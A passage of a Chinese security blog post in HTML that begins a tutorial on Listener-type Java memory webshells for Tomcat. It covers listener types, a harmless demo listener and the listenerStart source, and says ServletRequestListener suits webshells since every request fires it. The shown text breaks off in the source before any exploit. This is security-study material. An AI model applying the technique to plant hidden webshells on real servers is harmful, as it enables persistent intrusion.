@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="Listener型内存马">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java内存马二之Listener型内存马">
+<meta property="og:url" content="https://wanth3f1ag.top/2026/03/18/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BListener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="Listener型内存马">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/20240211001946-34c81f0a-c830-1-1756104784707-3.jpeg">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260318161227914.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825153310723.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825153355191.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825154258262.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825160456853.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825161014309.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825161519932.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825161617726.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825162843892.png">
+<meta property="article:published_time" content="2026-03-18T06:50:52.000Z">
+<meta property="article:modified_time" content="2026-03-18T12:19:25.299Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="javasec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/20240211001946-34c81f0a-c830-1-1756104784707-3.jpeg">
+
+
+<link rel="canonical" href="https://wanth3f1ag.top/2026/03/18/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BListener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2026/03/18/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BListener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2026/03/18/Java内存马之Listener型内存马/","title":"Java内存马二之Listener型内存马"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java内存马二之Listener型内存马 | root@wanth3f1ag</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-javasec"><a href="/categories/javasec/" rel="section">JavaSec</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%85%B3%E4%BA%8EListener%E7%9B%91%E5%90%AC%E5%99%A8"><span class="nav-number">1.</span> <span class="nav-text">0x01 关于Listener监听器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E5%AE%9E%E7%8E%B0Listener%E7%9A%84Demo"><span class="nav-number">2.</span> <span class="nav-text">0x02 实现Listener的Demo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%88%86%E6%9E%90Listener%E8%BF%90%E8%A1%8C%E7%9A%84%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">0x03 从代码层面分析Listener运行的整体流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-Listener%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="nav-number">4.</span> <span class="nav-text">0x04 Listener内存马实现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E7%9A%84EXP"><span class="nav-number">4.1.</span> <span class="nav-text">最终的EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84jsp%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">4.2.</span> <span class="nav-text">文件上传的jsp内存马</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">184</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">112</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2026/03/18/Java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8BListener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java内存马二之Listener型内存马 | root@wanth3f1ag">
+      <meta itemprop="description" content="Listener型内存马">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java内存马二之Listener型内存马
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-03-18 14:50:52 / 修改时间：20:19:25" itemprop="dateCreated datePublished" datetime="2026-03-18T14:50:52+08:00">2026-03-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/javasec/" itemprop="url" rel="index"><span itemprop="name">javasec</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>14k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>13 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">Listener型内存马</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="0x01-关于Listener监听器"><a href="#0x01-关于Listener监听器" class="headerlink" title="0x01 关于Listener监听器"></a>0x01 关于Listener监听器</h1><p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/20240211001946-34c81f0a-c830-1-1756104784707-3.jpeg" alt="img"></p>
+<p>从上面的图片以及之前介绍servlet处理逻辑的时候可以知道，当我们发送请求的时候的顺序是Listener-&gt;Filter-&gt;Servlet，Listener是最先被加载的</p>
+<p>在 <strong>Java Web</strong> 中，<strong>Listener（监听器）</strong>是一类用于监听和响应 <strong>Web 应用中发生的特定事件</strong> 的组件。它是一种 <strong>事件驱动机制</strong>，可以让开发者在事件发生时自动执行一些逻辑，而无需手动调用。</p>
+<p>在<code>tomcat</code>中，常见的<code>Listener</code>有以下几种：</p>
+<ol>
+<li><strong>ServletContextListener</strong> ：用来监听整个<code>Web</code>应用程序的启动和关闭事件，需要实现<code>contextInitialized</code>和<code>contextDestroyed</code>这两个方法</li>
+<li><strong>HttpSessionListener</strong>：用来监听<code>HTTP</code>会话的创建和销毁事件，需要实现<code>sessionCreated</code>和<code>sessionDestroyed</code>这两个方法</li>
+<li><strong>ServletRequestListener</strong>：用来监听<code>HTTP</code>请求的创建和销毁事件，需要实现<code>requestInitialized</code>和<code>requestDestroyed</code>这两个方法</li>
+<li><strong>HttpSessionAttributeListener</strong>：监听<code>HTTP</code>会话属性的添加、删除和替换事件，需要实现<code>attributeAdded</code>、<code>attributeRemoved</code>和<code>attributeReplaced</code>这三个方法。</li>
+</ol>
+<p>从上面不难看出，使用ServletRequestListener是最适合用来做内存马的了，因为只要发送了http请求他都会触发监听</p>
+<h1 id="0x02-实现Listener的Demo"><a href="#0x02-实现Listener的Demo" class="headerlink" title="0x02 实现Listener的Demo"></a>0x02 实现Listener的Demo</h1><p>我们先看看ServletRequestListener接口需要实现的方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> javax.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.EventListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ServletRequestListener</span> <span class="keyword">extends</span> <span class="title class_">EventListener</span> &#123;</span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>requestInitialized：</strong>在request对象创建时触发</p>
+<p><strong>requestDestroyed：</strong>在request对象销毁时触发</p>
+<p>这个接口继承了EventListener</p>
+<p>然后写个demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;initial TestListener&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroyed TestListener&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在web.xml中添加监听器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;listener&gt;</span><br><span class="line">  &lt;listener-class&gt;org.example.TestListener&lt;/listener-class&gt;</span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们运行起来看看呢</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20260318161227914.png" alt="image-20260318161227914"></p>
+<p>当我们访问对应路径的时候，会在控制台打印对应的消息</p>
+<p>然后我们来分析一下Listener运行的流程</p>
+<h1 id="0x03-从代码层面分析Listener运行的整体流程"><a href="#0x03-从代码层面分析Listener运行的整体流程" class="headerlink" title="0x03 从代码层面分析Listener运行的整体流程"></a>0x03 从代码层面分析Listener运行的整体流程</h1><p>分别在class和requestInitialized函数上分别打上断点</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825153310723.png" alt="image-20250825153310723"></p>
+<p>在函数调用栈中看到一个listenerStart函数，跟进看一下</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250825153355191.png" alt="image-20250825153355191"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">listenerStart</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Configuring application event listeners&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Instantiate the required listeners</span></span><br><span class="line">    String[] listeners = findApplicationListeners();</span><br><span class="line">    Object[] results = <span class="keyword">new</span> <span class="title class_">Object</span>[listeners.length];</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; results.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (getLogger().isTraceEnabled()) &#123;</span><br><span class="line">            getLogger().trace(<span class="string">&quot; Configuring event listener class &#x27;&quot;</span> + listeners[i] + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">listener</span> <span class="operator">=</span> listeners[i];</span><br><span class="line">            results[i] = getInstanceManager().newInstance(listener);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">throwable</span> <span class="operator">=</span> ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">            ExceptionUtils.handleThrowable(throwable);</span><br><span class="line">            getLogger().error(sm.getString(<span class="string">&quot;standardContext.applicationListener&quot;</span>, listeners[i]), throwable);</span><br><span class="line">            ok = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">        getLogger().error(sm.getString(<span class="string">&quot;standardContext.applicationSkipped&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sort listeners in two arrays</span></span><br><span class="line">    List&lt;Object&gt; eventListeners = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;Object&gt; lifecycleListeners = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Object result : results) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((result <span class="keyword">instanceof</span> ServletContextAttributeListener) ||</span><br><span class="line">                (result <span class="keyword">instanceof</span> ServletRequestAttributeListener) || (result <span class="keyword">instanceof</span> ServletRequestListener) ||</span><br><span class="line">                (result <span class="keyword">instanceof</span> HttpSessionIdListener) || (result <span class="keyword">instanceof</span> HttpSessionAttributeListener)) &#123;</span><br><span class="line">            eventListeners.add(result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((result <span class="keyword">instanceof</span> ServletContextListener) || (result <span class="keyword">instanceof</span> HttpSessionListener)) &#123;</span><br><span class="line">            lifecycleListeners.add(result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Listener instances may have been added directly to this Context by</span></span><br><span class="line">    <span class="comment">// ServletContextInitializers and other code via the pluggability APIs.</span></span><br><span class="line">    <span class="comment">// Put them these listeners after the ones defined in web.xml and/or</span></span><br><span class="line">    <span class="comment">// annotations then overwrite the list of instances with the new, full</span></span><br><span class="line">    <span class="comment">// list.</span></span><br><span class="line">    eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));</span><br><span class="line">    setApplicationEventListeners(eventListeners.toArray());</span><br><span class="line">    <span class="keyword">for</span> (Object lifecycleListener : getApplicationLifecycleListeners()) &#123;</span><br><span class="line">        lifecycleListeners.add(lifecycleListener);</span><br><span class="line">        <span class="keyword">if</span> (lifecycleListener <span class="keyword">instanceof</span> ServletContextListener) &#123;</span><br><span class="line">            noPluggabilityListeners.add(lifecycleListener);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    setApplicationLifecycleListeners(lifecycleListeners.toArray());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send application start events</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getLogger().isTraceEnabled()) &#123;</span><br><span class="line">        getLogger().trace(<span class="string">&quot;Sending application start events&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Ensure context is not null</span></span><br><span class="line">    getServletContext();</span><br><span class="line">    context.setNewServletContextListenerAllowed(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    Object[] instances = getApplicationLifecycleListeners();</span><br><span class="line">    <span class="keyword">if</span> (instances == <span class="literal">null</span> || instances.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ok;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletContextEvent</span> <span class="variable">event</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletContextEvent</span>(getServletContext());</span><br><span class="line">    <span class="type">ServletContextEvent</span> <span class="variable">tldEvent</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!noPluggabilityListeners.isEmpty()) &#123;</span><br><span class="line">        noPluggabilityServletContext = <span class="keyword">new</span> <span class="title 